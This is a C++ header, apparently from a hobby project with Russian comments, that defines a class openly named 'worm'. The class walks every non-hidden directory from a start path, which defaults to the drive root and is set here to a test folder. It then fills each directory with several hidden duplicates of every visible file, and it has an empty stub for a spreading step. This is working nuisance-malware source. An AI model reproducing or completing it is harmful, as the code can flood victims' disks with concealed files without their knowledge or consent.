#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <iostream>
#include <chrono>
#include <random>
#include <locale>
#include <codecvt>

using namespace std;
namespace fs = std::filesystem;


std::string get_own_path();
std::string get_drive_root_from_path(const std::string& full_path);
bool is_hidden(const fs::path& path);
void init_locale();
// Генератор случайных чисел
std::string generate_random_suffix();
// Генератор временной метки
std::string get_timestamp();

class worm
{
private:

	string path_to_start;
	vector <string> list_dir;
	int iteration;

public:
	worm(const string& path_to_start = get_drive_root_from_path(get_own_path()), int iteration = 2)
		: path_to_start(path_to_start), iteration(iteration) {};



	void search_list_dir(const std::string& path_to_dir) {
		try {
			for (const auto& entry : fs::directory_iterator(path_to_dir)) {
				if (entry.is_directory() && !is_hidden(entry.path())) {
					std::string dir_path = entry.path().string();
					list_dir.push_back(dir_path);
					search_list_dir(dir_path);
				}
			}
		}

		catch (const fs::filesystem_error& e) {
			std::cerr << "Error accessing " << path_to_dir << ": " << e.what() << "\n";
		}
		list_dir.push_back(path_to_dir);
	}

	void search_list_dir() {
		list_dir.clear();
		search_list_dir("E:\\test_worm");//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
	}

	void print_list_dir() {
		for (auto entry : list_dir) {
			cout << entry << endl;
		}
	}

	void copy_file() {
		init_locale();
		if (list_dir.empty()) {
			cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
			return;
		}

		for (const auto& dir : list_dir) {

			vector<fs::path> files_to_copy;//создали список файлов для каждой дирректории
			//cout << " В директории " << dir << "\n";

			for (const auto& entry : fs::directory_iterator(dir)) {
				try {
					// Получаем статус файла с обработкой ошибок
					error_code ec;
					auto status = entry.status(ec);

					if (ec || !fs::is_regular_file(status)) continue;

					// Проверка скрытости для Windows
					bool ishidden = false;
					DWORD attrs = GetFileAttributesW(entry.path().wstring().c_str());
					ishidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
						(attrs & FILE_ATTRIBUTE_HIDDEN);
					if (!ishidden) {
						files_to_copy.push_back(entry.path());
					}
				}
				catch (...) {
					continue; // Пропускаем проблемные файлы
				}
			}

			for (const auto& original_file : files_to_copy) { // копируем файлы и делаем их скрытными
				std::wstring ext = original_file.extension().wstring();
				std::wstring stem = original_file.stem().wstring();
				fs::path parent_dir = original_file.parent_path();

				cout << "Обрабатываем файл: " << original_file << "\n";

				// Создаем заданное количество копий
				for (int i = 1; i <= iteration; ++i) {

					// Создаем копию
					fs::path copy_path = parent_dir /
						(stem + L"_copy_" + std::to_wstring(std::time(nullptr)) + ext);

					try {
						fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);

						// 2. Устанавливаем атрибут "скрытый" (Unicode-версия)
						DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
						if (attrs != INVALID_FILE_ATTRIBUTES) {
							DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN;
							if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
								DWORD error = GetLastError();
								std::wcerr << L"Ошибка SetFileAttributesW: " << error << L"\n";
							}
						}
						else {
							DWORD error = GetLastError();
							std::wcerr << L"Ошибка GetFileAttributesW: " << error << L"\n";
						}
					}
					catch (const fs::filesystem_error& e) {
						cerr << "  Ошибка при создании копии: " << e.what() << "\n";
					}
				}




			}
		}
	}


	void create_wormix() {
		// test commit 1 йцу  йцу
	};
};

